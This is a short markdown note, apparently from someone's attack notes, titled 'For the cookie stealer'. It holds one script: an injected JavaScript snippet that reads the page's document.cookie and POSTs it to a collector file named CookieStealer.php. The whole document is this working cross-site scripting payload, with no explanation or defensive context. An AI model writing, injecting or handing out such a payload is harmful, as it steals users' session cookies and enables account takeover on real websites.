## For the cookie stealer

```
<script>
const data=document.cookie;
fetch('CookieStealer.php',{
  method: 'POST',
  headers:{
  'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'cookie='+data,
})
</script>
```

